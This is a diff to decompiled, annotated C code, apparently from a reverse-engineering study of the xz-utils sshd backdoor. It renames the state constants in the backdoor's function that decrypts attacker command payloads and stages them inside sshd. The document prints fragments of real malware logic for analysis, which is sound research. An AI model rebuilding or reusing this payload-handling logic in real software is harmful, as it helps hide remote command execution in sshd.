@@ -9,7 +9,7 @@
  * `secret_data_get_decrypted`. If the header/body lengths are sane and there is enough space left in `ctx->payload_buffer`,
  * it copies the plaintext body into the staging buffer, bumps `payload_bytes_buffered`, and then replays the decryption a
  * second time so the ChaCha keystream stays aligned with sshd's original consumer. Any failure (bad lengths, short
- * decrypts, exhausted buffer) forces `payload_state` back to 0xffffffff so future packets start from a clean slate.
+ * decrypts, exhausted buffer) forces `payload_state` back to PAYLOAD_STREAM_POISONED so future packets start from a clean slate.
  */
 
 #include "xzre_types.h"
@@ -49,10 +49,10 @@ BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_c
       return FALSE;
     }
     // AutoDoc: State 3 marks that sshd already consumed the payload buffer, so redundant decrypt requests short-circuit immediately.
-    if (ctx->payload_state == 3) {
+    if (ctx->payload_state == PAYLOAD_STREAM_COMMAND_READY) {
       return TRUE;
     }
-    if ((0x12 < payload_size) && (ctx->payload_state < 2)) {
+    if ((0x12 < payload_size) && ((uint)ctx->payload_state < 2)) {
       // AutoDoc: Stage the plaintext stride/index/bias header locally so ChaCha reuses the exact nonce sshd derived from the modulus chunk.
       *(u64 *)&hdr.field0_0x0 = *(u64 *)&payload->field0_0x0;
       hdr.field0_0x0.field1.cmd_type_bias = *(int64_t *)((long)&payload->field0_0x0 + 8);
@@ -88,7 +88,7 @@ BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_c
     }
   }
   // AutoDoc: Any validation failure poisons the state machine so the caller restarts the stream from scratch.
-  ctx->payload_state = 0xffffffff;
+  ctx->payload_state = PAYLOAD_STREAM_POISONED;
   return FALSE;
 }
 
